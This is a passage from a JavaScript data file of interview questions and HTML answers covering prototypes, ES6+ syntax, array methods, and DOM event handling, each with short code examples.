    // ── BATCH 1-D: Prototypes & Object Internals ───────────────────────────
    {q:"What is the prototype chain in JavaScript?",d:"medium",
     a:"Every JavaScript object has a hidden property <code>[[Prototype]]</code> pointing to another object (its prototype). When you access a property, JS looks up the chain until it finds it or hits <code>null</code>.<br><pre>const animal = {\n  breathe() { return 'breathing'; }\n};\n\nconst dog = Object.create(animal); // dog's [[Prototype]] = animal\ndog.bark = function() { return 'woof'; };\n\nconst puppy = Object.create(dog);  // puppy's [[Prototype]] = dog\n\npuppy.bark();    // found on dog — OK\npuppy.breathe(); // found on animal — OK (chain lookup)\npuppy.toString();// found on Object.prototype\n\n// Chain: puppy → dog → animal → Object.prototype → null\nconsole.log(Object.getPrototypeOf(puppy) === dog);    // true\nconsole.log(Object.getPrototypeOf(dog) === animal);   // true</pre>"},

    {q:"What is the difference between __proto__ and prototype?",d:"medium",
     a:"<ul><li><code>prototype</code> — property of <strong>constructor functions / classes</strong>. Used as the <code>[[Prototype]]</code> of all instances created with <code>new</code>.</li><li><code>__proto__</code> — accessor on <strong>all objects</strong> that points to their <code>[[Prototype]]</code>. Deprecated — use <code>Object.getPrototypeOf()</code> instead.</li></ul><pre>function Dog(name) { this.name = name; }\nDog.prototype.bark = function() { return 'woof'; };\n\nconst d = new Dog('Rex');\n\n// prototype: on the constructor\nconsole.log(Dog.prototype.bark); // function\n\n// __proto__: on the instance\nconsole.log(d.__proto__ === Dog.prototype); // true\nconsole.log(Object.getPrototypeOf(d) === Dog.prototype); // true (preferred)\n\n// Class syntax creates the same structure\nclass Cat {}\nconst c = new Cat();\nObject.getPrototypeOf(c) === Cat.prototype; // true</pre>"},

    {q:"What are classes in ES6?",d:"easy",
     a:"ES6 classes are <strong>syntactic sugar</strong> over prototype-based inheritance. They don't introduce a new object model.<br><pre>class Animal {\n  #sound; // private field (ES2022)\n\n  constructor(name) {\n    this.name = name;\n    this.#sound = 'generic';\n  }\n\n  speak() {\n    return `${this.name} says ${this.#sound}`;\n  }\n\n  static create(name) {\n    return new Animal(name);\n  }\n}\n\nclass Dog extends Animal {\n  constructor(name) {\n    super(name); // must call super first\n    this.#sound; // can't access parent's private\n  }\n\n  speak() {\n    return `${this.name} barks`; // override\n  }\n}\n\nconst d = new Dog('Rex');\nd.speak();         // 'Rex barks'\nd instanceof Dog;  // true\nd instanceof Animal; // true</pre>"},

    {q:"How do you compare Object and Map?",d:"medium",
     a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>Object</th><th style='padding:4px 8px'>Map</th></tr><tr><td style='padding:4px 8px'>Key types</td><td style='padding:4px 8px'>String/Symbol only</td><td style='padding:4px 8px'>Any type</td></tr><tr><td style='padding:4px 8px'>Order</td><td style='padding:4px 8px'>Not guaranteed (mostly insertion)</td><td style='padding:4px 8px'>Insertion order guaranteed</td></tr><tr><td style='padding:4px 8px'>Size</td><td style='padding:4px 8px'>Manual (Object.keys().length)</td><td style='padding:4px 8px'>map.size</td></tr><tr><td style='padding:4px 8px'>Default keys</td><td style='padding:4px 8px'>Has prototype keys</td><td style='padding:4px 8px'>Empty by default</td></tr><tr><td style='padding:4px 8px'>Iteration</td><td style='padding:4px 8px'>for...in (includes proto)</td><td style='padding:4px 8px'>for...of (clean)</td></tr></table><br><pre>const map = new Map();\nmap.set({ id: 1 }, 'object key'); // any type as key\nmap.set(42, 'number key');\nmap.size; // 2\n\n// Prefer Map when:\n// - keys are not strings\n// - frequent additions/deletions (better performance)\n// - need iteration in insertion order</pre>"},

    {q:"What is the Object.freeze method?",d:"easy",
     a:"<code>Object.freeze()</code> makes an object <strong>immutable</strong> — prevents adding, removing, or modifying properties (shallow freeze).<br><pre>const config = Object.freeze({\n  host: 'localhost',\n  port: 3000,\n  nested: { timeout: 5000 }\n});\n\nconfig.host = 'server';       // silently fails (TypeError in strict mode)\nconfig.newProp = 'x';         // silently fails\ndelete config.port;           // silently fails\n\nconsole.log(config.host);     // 'localhost' — unchanged\n\n// BUT nested objects are NOT frozen\nconfig.nested.timeout = 9999; // works! (shallow freeze)\n\n// Deep freeze:\nfunction deepFreeze(obj) {\n  Object.getOwnPropertyNames(obj).forEach(name => {\n    const val = obj[name];\n    if (typeof val === 'object' && val !== null) deepFreeze(val);\n  });\n  return Object.freeze(obj);\n}</pre>"},

    {q:"What is the purpose of Object.seal?",d:"medium",
     a:"<code>Object.seal()</code> <strong>prevents adding/removing properties</strong> but still allows modifying existing ones.<br><pre>const obj = Object.seal({ name: 'Alice', age: 30 });\n\nobj.name = 'Bob';      // OK — modification allowed\nobj.email = 'a@b.com'; // silently fails (no new props)\ndelete obj.age;        // silently fails\n\nconsole.log(obj); // { name: 'Bob', age: 30 }</pre><br><code>Object.isSealed(obj)</code> checks if an object is sealed."},

    {q:"What are the differences between Object.freeze and Object.seal?",d:"medium",
     a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Operation</th><th style='padding:4px 8px'>freeze</th><th style='padding:4px 8px'>seal</th></tr><tr><td style='padding:4px 8px'>Add properties</td><td style='padding:4px 8px'>No</td><td style='padding:4px 8px'>No</td></tr><tr><td style='padding:4px 8px'>Remove properties</td><td style='padding:4px 8px'>No</td><td style='padding:4px 8px'>No</td></tr><tr><td style='padding:4px 8px'>Modify values</td><td style='padding:4px 8px'>No</td><td style='padding:4px 8px'>Yes</td></tr><tr><td style='padding:4px 8px'>Check method</td><td style='padding:4px 8px'>Object.isFrozen()</td><td style='padding:4px 8px'>Object.isSealed()</td></tr></table><br><strong>Note:</strong> Both are shallow — nested objects are not affected. A frozen object is also sealed, but not vice versa."},

    {q:"What is a WeakSet?",d:"medium",
     a:"A <strong>WeakSet</strong> is like a Set but can only hold <strong>objects</strong> and holds <strong>weak references</strong> (objects can be garbage collected if no other references exist).<br><pre>const ws = new WeakSet();\nlet obj1 = { id: 1 };\nlet obj2 = { id: 2 };\n\nws.add(obj1);\nws.add(obj2);\nws.has(obj1); // true\nws.delete(obj1);\n\n// When obj2 is dereferenced, it can be GC'd\nobj2 = null; // WeakSet no longer holds it\n</pre><br><strong>Limitations:</strong> not iterable, no <code>size</code>, no <code>clear()</code>.<br><strong>Use cases:</strong><ul><li>Tracking which DOM nodes have been processed without preventing GC</li><li>Associating metadata with objects without memory leaks</li></ul>"},

    {q:"What is a WeakMap?",d:"medium",
     a:"A <strong>WeakMap</strong> holds key-value pairs where keys must be <strong>objects</strong> and are held with weak references (GC-able when no other references exist).<br><pre>const wm = new WeakMap();\nlet element = document.getElementById('btn');\n\n// Attach data to DOM element without preventing GC\nwm.set(element, { clickCount: 0, createdAt: Date.now() });\n\nwm.get(element).clickCount++;\nwm.has(element); // true\n\n// When element is removed from DOM and dereferenced:\nelement = null; // WeakMap entry eligible for GC</pre><br><strong>vs Map:</strong> WeakMap keys must be objects, not iterable, no <code>size</code>.<br><strong>Use cases:</strong> private data for objects, caching, associating extra data with DOM nodes."},

    {q:"What is a proxy object?",d:"hard",
     a:"A <strong>Proxy</strong> wraps an object and intercepts/customises operations on it (get, set, delete, call, etc.).<br><pre>const handler = {\n  get(target, prop) {\n    console.log(`Getting ${prop}`);\n    return prop in target ? target[prop] : `Property ${prop} not found`;\n  },\n  set(target, prop, value) {\n    if (typeof value !== 'number') throw new TypeError('Numbers only!');\n    target[prop] = value;\n    return true;\n  }\n};\n\nconst nums = new Proxy({}, handler);\nnums.x = 5;       // OK\nnums.y = 'hello'; // TypeError: Numbers only!\nconsole.log(nums.x); // Getting x → 5\nconsole.log(nums.z); // Getting z → 'Property z not found'</pre><br><strong>Use cases:</strong> validation, logging, reactive data binding (Vue 3 uses Proxy), access control."},

    {q:"How do you copy properties from one object to another?",d:"easy",
     a:"<pre>const target = { a: 1 };\nconst source = { b: 2, c: 3 };\n\n// Object.assign — shallow copy / merge\nconst result = Object.assign(target, source);\n// target is mutated: { a:1, b:2, c:3 }\n\n// Spread operator — preferred for non-mutation\nconst merged = { ...target, ...source };\n\n// Clone (shallow)\nconst clone = Object.assign({}, source);\nconst clone2 = { ...source };\n\n// Deep copy (ES2022)\nconst deepClone = structuredClone(source);\n\n// Deep copy (older)\nconst deepClone2 = JSON.parse(JSON.stringify(source)); // loses functions, Date, undefined\n</pre>"},

    {q:"How do you create an object with a specific prototype?",d:"medium",
     a:"<pre>const proto = {\n  greet() { return `Hello, I'm ${this.name}`; }\n};\n\n// Object.create — creates object with specified prototype\nconst obj = Object.create(proto);\nobj.name = 'Alice';\nobj.greet(); // 'Hello, I'm Alice'\n\n// Verify prototype\nObject.getPrototypeOf(obj) === proto; // true\n\n// Object.create(null) — no prototype at all\nconst bareObj = Object.create(null);\n// bareObj has no toString, hasOwnProperty, etc.\n// Useful as a pure dictionary\n</pre>"},

    {q:"How do you define a property on an Object constructor (Object.defineProperty)?",d:"medium",
     a:"<code>Object.defineProperty()</code> defines a property with fine-grained control over its descriptor.<br><pre>const obj = {};\nObject.defineProperty(obj, 'name', {\n  value: 'Alice',\n  writable: false,    // cannot reassign\n  enumerable: true,   // shows in for...in, Object.keys\n  configurable: false // cannot redefine or delete\n});\n\nobj.name = 'Bob';       // silently fails (TypeError in strict)\nconsole.log(obj.name);  // 'Alice'\n\n// Getter/Setter via defineProperty\nconst person = { _age: 25 };\nObject.defineProperty(person, 'age', {\n  get() { return this._age; },\n  set(val) {\n    if (val < 0) throw new RangeError('Age must be positive');\n    this._age = val;\n  }\n});\nperson.age = 30; // OK\nperson.age = -1; // RangeError</pre>"},

    {q:"How do you get enumerable key-value pairs of an object?",d:"easy",
     a:"<pre>const obj = { a: 1, b: 2, c: 3 };\n\n// Object.keys — array of own enumerable keys\nObject.keys(obj);    // ['a', 'b', 'c']\n\n// Object.values — array of own enumerable values\nObject.values(obj);  // [1, 2, 3]\n\n// Object.entries — array of [key, value] pairs\nObject.entries(obj); // [['a',1], ['b',2], ['c',3]]\n\n// Iterate with destructuring\nfor (const [key, value] of Object.entries(obj)) {\n  console.log(`${key}: ${value}`);\n}\n\n// Reconstruct from entries\nconst newObj = Object.fromEntries(\n  Object.entries(obj).map(([k, v]) => [k, v * 2])\n); // { a:2, b:4, c:6 }</pre>"},

    {q:"What is the difference between const and Object.freeze?",d:"medium",
     a:"<strong>const</strong> prevents <em>rebinding</em> the variable — you can't reassign it to a different value.<br><strong>Object.freeze</strong> prevents <em>mutation</em> of the object's properties.<br><pre>const obj = { x: 1 };\nobj.x = 2;     // OK — mutation allowed with const\nobj = {};      // TypeError — rebinding blocked by const\n\nconst frozen = Object.freeze({ x: 1 });\nfrozen.x = 2;  // silently fails — mutation blocked by freeze\nfrozen = {};   // TypeError — rebinding also blocked by const\n\n// Use both together for fully immutable constant:\nconst CONFIG = Object.freeze({\n  API_URL: 'https://api.example.com',\n  TIMEOUT: 5000\n});</pre>"}
  ]
};


// ── BATCH 2-E: ES6+ Modern Syntax ────────────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is destructuring assignment?",d:"easy",
   a:"<strong>Destructuring</strong> extracts values from arrays or properties from objects into distinct variables.<br><br><strong>Array destructuring:</strong><br><pre>const [a, b, c] = [1, 2, 3];\nconst [first, , third] = [1, 2, 3];  // skip middle\nconst [x = 10, y = 20] = [5];        // defaults: x=5, y=20\n\n// Swap variables\nlet p = 1, q = 2;\n[p, q] = [q, p];</pre><br><strong>Object destructuring:</strong><br><pre>const { name, age } = { name: 'Alice', age: 30 };\nconst { name: alias, score = 100 } = { name: 'Bob' }; // rename + default\nconst { address: { city } } = { address: { city: 'NYC' } }; // nested\nconst { a, ...rest } = { a:1, b:2, c:3 }; // rest = {b:2,c:3}</pre>"},

  {q:"What is the spread operator?",d:"easy",
   a:"The <strong>spread operator</strong> (<code>...</code>) expands an iterable into individual elements.<br><pre>const arr = [1, 2, 3];\nconst arr2 = [...arr, 4, 5];   // [1,2,3,4,5]\nconst copy  = [...arr];         // shallow copy\nMath.max(...arr);               // 3\n\n// Objects (ES2018)\nconst obj  = { a: 1, b: 2 };\nconst obj2 = { ...obj, c: 3 };  // { a:1, b:2, c:3 }\nconst merged = { ...defaults, ...overrides }; // later props win\n\n// String\n[...'hello']; // ['h','e','l','l','o']</pre>"},

  {q:"What is a rest parameter?",d:"easy",
   a:"The <strong>rest parameter</strong> (<code>...args</code>) collects all remaining arguments into a real array — must be the last parameter.<br><pre>function sum(...nums) {\n  return nums.reduce((a, b) => a + b, 0);\n}\nsum(1, 2, 3, 4); // 10\n\nfunction log(level, ...messages) {\n  console.log('[' + level + ']', ...messages);\n}\n\n// Destructuring rest\nconst [head, ...tail] = [1, 2, 3, 4]; // tail=[2,3,4]\nconst { a, ...remaining } = { a:1, b:2, c:3 };</pre><br><strong>vs arguments:</strong> rest is a real Array; <code>arguments</code> is array-like and unavailable in arrow functions."},

  {q:"What are template literals?",d:"easy",
   a:"<strong>Template literals</strong> use backticks and support interpolation and multi-line strings.<br><pre>const name = 'Alice', age = 30;\n\n// Interpolation\n`Hello, ${name}! You are ${age} years old.`\n\n// Expressions\n`2 + 2 = ${2 + 2}`\n`Status: ${age >= 18 ? 'adult' : 'minor'}`\n\n// Multi-line\nconst html = `\n  &lt;div&gt;&lt;h1&gt;${name}&lt;/h1&gt;&lt;/div&gt;\n`;\n\n// Raw (escapes not processed)\nString.raw`Hello\\nWorld`; // 'Hello\\\\nWorld'</pre>"},

  {q:"What are default parameters?",d:"easy",
   a:"Default parameters provide fallback values when an argument is <code>undefined</code> (not <code>null</code>).<br><pre>function greet(name = 'World', greeting = 'Hello') {\n  return greeting + ', ' + name + '!';\n}\ngreet();                 // 'Hello, World!'\ngreet('Alice');          // 'Hello, Alice!'\ngreet(undefined, 'Hi'); // 'Hi, World!'  — undefined triggers default\ngreet(null, 'Hi');      // 'Hi, null!'   — null does NOT trigger default\n\n// Expression defaults\nfunction rect(w, h = w) { return w * h; }\nfunction createUser(name, id = Date.now()) { return { name, id }; }</pre>"},

  {q:"What are ES modules in JavaScript?",d:"medium",
   a:"<strong>ES modules</strong> split code into reusable files using <code>import</code> / <code>export</code>.<br><pre>// math.js\nexport const PI = 3.14;\nexport function add(a, b) { return a + b; }\n\n// circle.js\nexport default class Circle {\n  constructor(r) { this.r = r; }\n  area() { return PI * this.r ** 2; }\n}\n\n// main.js\nimport Circle        from './circle.js';  // default import\nimport { add }       from './math.js';     // named\nimport { add as sum } from './math.js';    // alias\nimport * as math     from './math.js';     // namespace</pre><br><strong>Key facts:</strong> always strict mode, module-level scope, evaluated once and cached, imports are live bindings."},

  {q:"What are dynamic imports?",d:"medium",
   a:"<code>import()</code> loads a module <strong>lazily at runtime</strong> — returns a Promise.<br><pre>// Lazy load on user action\nbtn.addEventListener('click', async () => {\n  const { Chart } = await import('./chart.js');\n  new Chart(data);\n});\n\n// Conditional / locale-based\nconst { default: msgs } = await import('./i18n/' + locale + '.js');\n\n// Parallel loading\nconst [modA, modB] = await Promise.all([\n  import('./a.js'),\n  import('./b.js')\n]);</pre><br><strong>Use case:</strong> code splitting in SPAs — reduces initial bundle size by loading features on demand."},

  {q:"What is an Iterator in JavaScript?",d:"medium",
   a:"An <strong>iterator</strong> is any object implementing the iterator protocol: a <code>next()</code> method returning <code>{ value, done }</code>.<br><pre>function range(start, end) {\n  let cur = start;\n  return {\n    next() {\n      return cur <= end\n        ? { value: cur++, done: false }\n        : { value: undefined, done: true };\n    }\n  };\n}\nconst it = range(1, 3);\nit.next(); // { value:1, done:false }\nit.next(); // { value:2, done:false }\nit.next(); // { value:3, done:false }\nit.next(); // { value:undefined, done:true }\n\n// Built-ins expose Symbol.iterator\nconst arr = [1,2,3];\nconst iter = arr[Symbol.iterator]();</pre>"},

  {q:"What are generators in JavaScript?",d:"hard",
   a:"<strong>Generators</strong> are functions that can pause execution with <code>yield</code> and resume later, producing values lazily.<br><pre>function* counter(start = 0) {\n  while (true) yield start++;\n}\nconst gen = counter(1);\ngen.next(); // { value:1, done:false }\ngen.next(); // { value:2, done:false }\n\n// Finite, spread-compatible\nfunction* range(a, b) {\n  for (let i = a; i <= b; i++) yield i;\n}\n[...range(1, 5)]; // [1,2,3,4,5]\n\n// Two-way data flow\nfunction* adder() {\n  let total = 0;\n  while (true) total += yield total;\n}\nconst g = adder();\ng.next();  // { value:0 } — prime\ng.next(5); // { value:5 }\ng.next(3); // { value:8 }</pre>"},

  {q:"What are the differences between for...of and for...in?",d:"medium",
   a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>for...in</th><th style='padding:4px 8px'>for...of</th></tr><tr><td style='padding:4px 8px'>Iterates over</td><td style='padding:4px 8px'>Enumerable property <strong>keys</strong></td><td style='padding:4px 8px'>Iterable <strong>values</strong></td></tr><tr><td style='padding:4px 8px'>Works on</td><td style='padding:4px 8px'>Objects, arrays</td><td style='padding:4px 8px'>Arrays, strings, Map, Set</td></tr><tr><td style='padding:4px 8px'>Prototype chain</td><td style='padding:4px 8px'>Yes — includes inherited</td><td style='padding:4px 8px'>No</td></tr></table><br><pre>const arr = [10, 20, 30];\narr.extra = 'oops';\n\nfor (const key in arr) console.log(key); // '0','1','2','extra'\nfor (const val of arr) console.log(val); // 10, 20, 30 only\n\n// for...in best used on plain objects\nconst obj = { a:1, b:2 };\nfor (const k in obj) console.log(k); // 'a','b'</pre>"},

  {q:"What are enhanced object literals in ES6?",d:"easy",
   a:"ES6 added shorthand syntax for objects:<br><pre>const name = 'Alice', age = 30;\n\n// 1. Property shorthand\nconst user = { name, age }; // { name: name, age: age }\n\n// 2. Method shorthand\nconst calc = {\n  value: 0,\n  add(n) { this.value += n; },       // no 'function' keyword\n  subtract(n) { this.value -= n; }\n};\n\n// 3. Computed property names\nconst key = 'score';\nconst obj = {\n  [key]: 100,           // { score: 100 }\n  [key + '_max']: 200   // { score_max: 200 }\n};\n\n// 4. Getter / Setter\nconst circle = {\n  r: 5,\n  get area() { return Math.PI * this.r ** 2; },\n  set diameter(d) { this.r = d / 2; }\n};</pre>"},

  {q:"What are the key features of ES6?",d:"easy",
   a:"<strong>ES6 (ES2015)</strong> was the biggest JavaScript update. Key additions:<ul><li><strong>let / const</strong> — block scoping</li><li><strong>Arrow functions</strong> — <code>const f = x => x*2</code></li><li><strong>Template literals</strong> — backtick strings</li><li><strong>Destructuring</strong> — arrays and objects</li><li><strong>Default parameters</strong></li><li><strong>Rest / Spread</strong> — <code>...args</code></li><li><strong>Classes</strong> — syntactic sugar for prototypes</li><li><strong>Modules</strong> — <code>import / export</code></li><li><strong>Promises</strong> — built-in async</li><li><strong>Symbol</strong> — unique primitive type</li><li><strong>Map / Set / WeakMap / WeakSet</strong></li><li><strong>Iterators / Generators</strong></li><li><strong>Proxy / Reflect</strong></li><li><strong>for...of</strong> loop</li></ul>"}
);


// ── BATCH 2-F: Arrays & Data Manipulation ────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is the difference between map and forEach?",d:"easy",
   a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>map</th><th style='padding:4px 8px'>forEach</th></tr><tr><td style='padding:4px 8px'>Returns</td><td style='padding:4px 8px'>New array</td><td style='padding:4px 8px'>undefined</td></tr><tr><td style='padding:4px 8px'>Chainable</td><td style='padding:4px 8px'>Yes</td><td style='padding:4px 8px'>No</td></tr><tr><td style='padding:4px 8px'>Use for</td><td style='padding:4px 8px'>Transforming data</td><td style='padding:4px 8px'>Side effects</td></tr></table><br><pre>const nums = [1, 2, 3];\n\n// map — returns new array\nconst doubled = nums.map(x => x * 2); // [2,4,6]\n\n// forEach — side effects only, returns undefined\nnums.forEach(x => console.log(x));\n\n// map is chainable, forEach is not\nnums.map(x => x*2).filter(x => x > 2); // [4,6]</pre>"},

  {q:"What is the difference between shallow and deep copy?",d:"medium",
   a:"<strong>Shallow copy</strong> copies only top-level properties — nested objects remain shared references.<br><strong>Deep copy</strong> recursively copies all levels — fully independent.<br><pre>const original = { a: 1, nested: { b: 2 } };\n\n// SHALLOW — spread or Object.assign\nconst s = { ...original };\ns.a = 99;          // original.a unchanged\ns.nested.b = 99;   // original.nested.b ALSO changes! Same ref.\n\n// DEEP — structuredClone (ES2022, recommended)\nconst deep = structuredClone(original);\ndeep.nested.b = 99; // original.nested.b unchanged\n\n// JSON (loses functions, Date, undefined, circular refs)\nconst deep2 = JSON.parse(JSON.stringify(original));</pre>"},

  {q:"What is structuredClone for deep copying?",d:"medium",
   a:"<code>structuredClone()</code> is a built-in (ES2022) deep-clone function using the Structured Clone Algorithm.<br><pre>const obj = {\n  name: 'Alice',\n  scores: [1, 2, 3],\n  date: new Date(),\n  nested: { x: { y: 42 } }\n};\n\nconst clone = structuredClone(obj);\nclone.nested.x.y = 99;\nconsole.log(obj.nested.x.y); // 42 — unaffected\n\n// Supports Date, Map, Set, ArrayBuffer, RegExp\nconst map = new Map([['key', { v: 1 }]]);\nconst clonedMap = structuredClone(map); // works!\n\n// Cannot clone functions or DOM nodes\nstructuredClone(function(){}) // DataCloneError</pre>"},

  {q:"How do you get unique values of an array?",d:"easy",
   a:"<pre>const arr = [1, 2, 2, 3, 3, 3, 4];\n\n// Method 1: Set (most concise)\nconst unique = [...new Set(arr)]; // [1,2,3,4]\n\n// Method 2: filter + indexOf\nconst unique2 = arr.filter((v, i) => arr.indexOf(v) === i);\n\n// Unique objects by property\nconst users = [{id:1},{id:2},{id:1}];\nconst uniqueUsers = [...new Map(users.map(u => [u.id, u])).values()];</pre>"},

  {q:"How do you flatten multi-dimensional arrays?",d:"medium",
   a:"<pre>const nested = [1, [2, [3, [4]]], 5];\n\nnested.flat();          // [1,2,[3,[4]],5]  — 1 level (default)\nnested.flat(2);         // [1,2,3,[4],5]    — 2 levels\nnested.flat(Infinity);  // [1,2,3,4,5]      — fully flatten\n\n// flatMap — map + flat(1) in one pass\n[1,2,3].flatMap(x => [x, x*2]); // [1,2,2,4,3,6]\n\n// Legacy recursive approach\nfunction flatten(arr) {\n  return arr.reduce(\n    (acc, item) => acc.concat(Array.isArray(item) ? flatten(item) : item), []\n  );\n}</pre>"},

  {q:"What are array mutation methods?",d:"easy",
   a:"<strong>Mutating</strong> methods modify the original array in-place:<br><pre>const a = [1, 2, 3];\na.push(4);         // add to end    → [1,2,3,4]\na.pop();           // remove end    → [1,2,3]\na.unshift(0);      // add to start  → [0,1,2,3]\na.shift();         // remove start  → [1,2,3]\na.reverse();       // reverse       → [3,2,1]\na.sort((x,y)=>x-y);// sort in-place\na.splice(1,1,'x'); // remove/insert → [3,'x',1]\na.fill(0,0,2);     // fill indices  → [0,0,1]</pre><br><strong>Non-mutating ES2023 equivalents:</strong><br><pre>arr.toReversed()      // copy, reversed\narr.toSorted((a,b)=>a-b) // copy, sorted\narr.toSpliced(1,1,'x')   // copy, spliced\narr.with(1, 'x')          // copy with index 1 replaced</pre>"},

  {q:"How do you remove falsy values from an array?",d:"easy",
   a:"<pre>const arr = [0, 1, false, 2, '', 3, null, undefined, NaN, 4];\n\n// Boolean constructor as predicate\nconst truthy = arr.filter(Boolean); // [1, 2, 3, 4]\n\n// Explicit\nconst truthy2 = arr.filter(x => !!x);\n\n// Falsy values: false, 0, -0, 0n, '', null, undefined, NaN</pre>"},

  {q:"How do you empty an array?",d:"easy",
   a:"<pre>let arr = [1, 2, 3];\nconst ref = arr;\n\n// Method 1: length = 0 (mutates in-place — all refs updated)\narr.length = 0;\nconsole.log(ref); // [] ← ref is also empty\n\n// Method 2: splice (also mutates)\narr.splice(0, arr.length);\n\n// Method 3: reassign (ref keeps old array)\narr = [];\nconsole.log(ref); // [1,2,3] ← ref still points to old array</pre>"},

  {q:"What is Array.some() and Array.every()?",d:"easy",
   a:"<code>some()</code> returns <code>true</code> if <strong>at least one</strong> element passes the test (short-circuits on first match).<br><code>every()</code> returns <code>true</code> only if <strong>all</strong> elements pass (short-circuits on first failure).<br><pre>const nums = [1, 2, 3, 4, 5];\n\nnums.some(x => x > 4);   // true  (5 passes)\nnums.some(x => x > 10);  // false (none pass)\n\nnums.every(x => x > 0);  // true  (all pass)\nnums.every(x => x > 2);  // false (1 and 2 fail)\n\n// Short-circuit demo\n[1, 100, 2].some(x => {\n  console.log(x); // logs 1, 100 then stops\n  return x > 50;\n}); // true</pre>"},

  {q:"How do you combine two or more arrays?",d:"easy",
   a:"<pre>const a = [1, 2], b = [3, 4], c = [5, 6];\n\n// Spread (creates new array)\nconst merged = [...a, ...b, ...c]; // [1,2,3,4,5,6]\n\n// concat (non-mutating)\nconst merged2 = a.concat(b, c);   // [1,2,3,4,5,6]\n\n// flat (from nested)\n[[1,2],[3,4],[5,6]].flat(); // [1,2,3,4,5,6]\n\n// Merge + dedupe\n[...new Set([...a, ...b])]; // unique values only</pre>"},

  {q:"How do you sort an array correctly in JavaScript?",d:"medium",
   a:"<code>Array.sort()</code> sorts in-place. Without a comparator it converts elements to <strong>strings</strong> — wrong for numbers!<br><pre>// String sort (default — often wrong for numbers)\n[10, 1, 21, 2].sort();              // [1, 10, 2, 21] — WRONG\n\n// Correct numeric sort\n[10, 1, 21, 2].sort((a, b) => a-b); // [1, 2, 10, 21] ascending\n[10, 1, 21, 2].sort((a, b) => b-a); // [21, 10, 2, 1] descending\n\n// Sort objects by property\nusers.sort((a, b) => a.name.localeCompare(b.name));\n\n// Non-mutating sort (ES2023)\nconst sorted = arr.toSorted((a, b) => a - b);</pre>"},

  {q:"How do you reverse an array?",d:"easy",
   a:"<pre>const arr = [1, 2, 3, 4, 5];\n\n// reverse() — mutates original\narr.reverse(); // arr is now [5,4,3,2,1]\n\n// Non-mutating (ES2023)\nconst rev = arr.toReversed(); // new array\n\n// Non-mutating (older)\nconst rev2 = [...arr].reverse();\n\n// Reverse a string\n'hello'.split('').reverse().join(''); // 'olleh'</pre>"}
);


// ── BATCH 2-G: Browser, DOM & Events ─────────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is event flow in JavaScript?",d:"easy",
   a:"<strong>Event flow</strong> describes how events travel through the DOM in three phases:<ol><li><strong>Capture phase</strong> — event travels DOWN: window → document → ... → target's parent</li><li><strong>Target phase</strong> — event reaches the target element</li><li><strong>Bubble phase</strong> — event travels UP: target → parent → ... → window</li></ol><pre>// Listen in capture phase\nelement.addEventListener('click', handler, true);\n// Listen in bubble phase (default)\nelement.addEventListener('click', handler, false);</pre>"},

  {q:"What is event bubbling?",d:"easy",
   a:"<strong>Event bubbling</strong> is when an event triggered on a child element propagates UP through its ancestors.<br><pre>document.getElementById('outer').addEventListener('click', () => {\n  console.log('outer'); // triggered via bubbling\n});\ndocument.getElementById('btn').addEventListener('click', () => {\n  console.log('button'); // triggered directly\n});\n// Clicking button logs: 'button' then 'outer'\n\n// Stop bubbling\nbtn.addEventListener('click', e => e.stopPropagation());</pre>"},

  {q:"What is event capturing?",d:"easy",
   a:"<strong>Event capturing</strong> is the phase where the event travels DOWN from the root to the target before bubbling back up.<br><pre>// Enable capture with true as 3rd argument\ndocument.addEventListener('click', e => {\n  console.log('doc CAPTURE', e.target.id);\n}, true);\n\ndocument.getElementById('btn').addEventListener('click', () => {\n  console.log('btn BUBBLE');\n});\n\n// Clicking #btn logs:\n// 'doc CAPTURE btn'  (capture first, top-down)\n// 'btn BUBBLE'       (bubble after)</pre>"},

  {q:"What is event delegation?",d:"medium",
   a:"<strong>Event delegation</strong> attaches one listener on a parent to handle events from many children via bubbling.<br><pre>&lt;ul id=\"list\"&gt;\n  &lt;li data-id=\"1\"&gt;Item 1&lt;/li&gt;\n  &lt;li data-id=\"2\"&gt;Item 2&lt;/li&gt;\n&lt;/ul&gt;\n\n// One listener handles all current and future items\ndocument.getElementById('list').addEventListener('click', e => {\n  const li = e.target.closest('li');\n  if (li) console.log('clicked id:', li.dataset.id);\n});</pre><br><strong>Benefits:</strong> fewer listeners (memory efficient), works for dynamically added elements, cleaner code."},

  {q:"What is the use of preventDefault?",d:"easy",
   a:"<code>e.preventDefault()</code> cancels the default browser action — does NOT stop event propagation.<br><pre>// Prevent form page reload\nform.addEventListener('submit', e => {\n  e.preventDefault();\n  submitViaFetch(form);\n});\n\n// Prevent link navigation\nlink.addEventListener('click', e => {\n  e.preventDefault();\n  router.navigate(link.href);\n});\n\n// Required to allow drop on dragover\ndropzone.addEventListener('dragover', e => e.preventDefault());</pre>"},

  {q:"What is the use of stopPropagation?",d:"easy",
   a:"<code>e.stopPropagation()</code> prevents the event from bubbling to parent elements.<br><pre>child.addEventListener('click', e => {\n  e.stopPropagation(); // parent handler won't fire\n  doChildStuff();\n});\n\n// stopImmediatePropagation — also stops other listeners on same element\nbtn.addEventListener('click', e => {\n  e.stopImmediatePropagation();\n  console.log('first');\n});\nbtn.addEventListener('click', () => {\n  console.log('second'); // never runs\n});\n\n// Summary:\n// stopPropagation     — stops bubble to parents\n// stopImmediatePropagation — stops bubble + other listeners on same element\n// preventDefault      — stops default action only</pre>"},

  {q:"What is the difference between reflow and repaint?",d:"medium",
   a:"<strong>Reflow</strong> — browser recalculates layout (positions, sizes). Expensive.<br><strong>Repaint</strong> — browser redraws pixels without changing layout (color, visibility). Cheaper.<br><pre>// Triggers REFLOW\nelement.style.width = '200px';\nconsole.log(element.offsetHeight); // forces synchronous reflow!\n\n// Triggers REPAINT only\nelement.style.color = 'red';\n\n// AVOID layout thrashing — read all then write all\n// BAD:\nelements.forEach(el => el.style.height = el.offsetHeight + 10 + 'px');\n// GOOD:\nconst heights = elements.map(el => el.offsetHeight);\nelements.forEach((el,i) => el.style.height = heights[i] + 10 + 'px');</pre>"},

  {q:"Why is it important to remove event listeners after use?",d:"medium",
